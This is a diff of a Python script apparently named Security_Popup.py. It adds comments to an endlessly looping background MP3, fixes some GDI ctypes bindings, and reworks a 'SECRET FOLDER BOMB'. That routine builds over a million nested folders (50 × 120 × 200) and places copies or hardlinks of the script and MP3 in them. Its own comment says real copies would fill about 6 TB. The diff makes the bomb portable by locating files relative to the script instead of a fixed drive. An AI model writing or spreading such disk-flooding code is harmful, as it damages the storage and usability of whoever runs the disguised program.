@@ -7,7 +7,7 @@ import shutil
 import threading
 
 # ============================================================
-# MUSIC
+# MUSIC  --  background MP3 that loops forever (Windows MCI)
 # ============================================================
 SONG_FILE = "dod2-pupsies-misery-589685.mp3"
 _music_alias = None
@@ -65,20 +65,21 @@ def stop_music():
         _music_alias = None
 
 # ============================================================
-# SECRET FOLDER BOMB
+# SECRET FOLDER BOMB  (daemon thread; safe to kill mid-way)
 # ============================================================
-SRC_PY  = r"E:\Coding\Security_Popup.py"
-SRC_MP3 = r"E:\Coding\dod2-pupsies-misery-589685.mp3"
+# This dynamically finds the folder the script is running in
+SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__)) if '__file__' in globals() else os.getcwd()
+SRC_PY  = os.path.join(SCRIPT_DIR, "Security_Popup.py")
+SRC_MP3 = os.path.join(SCRIPT_DIR, SONG_FILE)
 
-L1_COUNT = 50
-L2_COUNT = 120
-L3_COUNT = 200
+L1_COUNT = 50      # level-1 subfolders inside Secret
+L2_COUNT = 120     # level-2 subfolders inside each level-1
+L3_COUNT = 200     # level-3 subfolders inside each level-2
 
 USE_HARDLINKS = True    # True = metadata only (~GBs).  False = real 6 TB copies.
 DRY_RUN       = False   # True = only estimate size & file count, do nothing.
 
 def _place_file(src, dst, try_hardlink=True):
-    """Place src at dst, using a hardlink if possible, else a real copy."""
     try:
         if os.path.exists(dst):
             return True
@@ -87,7 +88,7 @@ def _place_file(src, dst, try_hardlink=True):
                 os.link(src, dst)
                 return True
             except OSError:
-                pass    # cross-volume, FAT32, permission, etc → fall back
+                pass
         shutil.copyfile(src, dst)
         return True
     except OSError:
@@ -116,7 +117,6 @@ def create_secret_bomb():
             print("[Secret bomb: source files not found, skipping.]")
             return
 
-        # ---- same-volume check for hardlink feasibility ----
         try:
             same_vol = (os.path.splitdrive(secret)[0].upper() ==
                         os.path.splitdrive(SRC_MP3)[0].upper())
@@ -151,7 +151,7 @@ def create_secret_bomb():
 
         made_folders = 0
         made_files   = 0
-        report_every = 5000    # leaf folders
+        report_every = 5000
 
         # ---- Secret root ----
         _place_file(SRC_PY,  os.path.join(secret, "Security_Popup.py"), do_links)
@@ -247,8 +247,8 @@ gdi32.CreateCompatibleBitmap.restype  = ctypes.c_void_p
 gdi32.CreateCompatibleBitmap.argtypes = [ctypes.c_void_p, ctypes.c_int, ctypes.c_int]
 gdi32.SelectObject.restype  = ctypes.c_void_p
 gdi32.SelectObject.argtypes = [ctypes.c_void_p, ctypes.c_void_p]
-gdi32.DeleteObject.argtypes = ctypes.c_void_p
-gdi32.DeleteDC.argtypes     = ctypes.c_void_p
+gdi32.DeleteObject.argtypes = [ctypes.c_void_p]
+gdi32.DeleteDC.argtypes     = [ctypes.c_void_p]
 gdi32.BitBlt.restype  = ctypes.c_bool
 gdi32.BitBlt.argtypes = [ctypes.c_void_p, ctypes.c_int, ctypes.c_int,
                          ctypes.c_int, ctypes.c_int, ctypes.c_void_p,
